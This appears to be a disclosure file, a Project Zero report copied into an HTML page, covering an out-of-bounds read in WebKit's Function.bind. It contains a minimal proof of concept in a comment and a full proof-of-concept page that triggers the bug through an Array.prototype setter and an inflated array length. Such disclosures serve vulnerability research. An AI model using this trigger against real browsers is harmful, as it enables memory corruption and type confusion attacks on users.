@@ -1,0 +1,70 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1033
+
+There is an out-of-bounds read when reading the bound arguments array of a bound function. When Function.bind is called, the arguments to the call are transferred to an Array before they are passed to JSBoundFunction::JSBoundFunction. Since it is possible that the Array prototype has had a setter added to it, it is possible for user script to obtain a reference to this Array, and alter it so that the length is longer than the backing native butterfly array. Then when boundFunctionCall attempts to copy this array to the call parameters, it assumes the length is not longer than the allocated array (which would be true if it wasn't altered), and reads out of bounds.
+
+This is likely exploitable, because the read values are treated as JSValues, so this issue can allow type confusion if the attacker controls any of the unallocated values that are read.
+
+This issue is only in WebKit trunk and Safari preview, it hasn't made it to regular Safari releases yet.
+
+
+A minimal PoC is as follows, and a full PoC is attached.
+
+
+var ba;
+
+function s(){
+	ba = this;
+}
+
+
+function dummy(){
+	alert("just a function");
+}
+
+
+Object.defineProperty(Array.prototype, "0", {set : s });
+var f = dummy.bind({}, 1, 2, 3, 4);
+ba.length = 100000;
+f(1, 2, 3);
+-->
+
+<html>
+<body>
+<script>
+
+var ba;
+
+function s(){
+	alert("in s");
+	ba = this;
+}
+
+
+function g(){
+	alert("in g");
+	return 7;
+}
+
+
+function dummy(){
+	alert("just a function");
+}
+
+alert("start");
+
+try{
+Object.defineProperty(Array.prototype, "0", {set : s, get : g});
+var f = dummy.bind({}, 1, 2, 3, 4);
+alert("ba" + ba);
+ba.length = 100000;
+f(1, 2, 3);
+}catch(e){
+
+	alert(e.message);
+
+}
+
+</script>
+</body>
+</html>
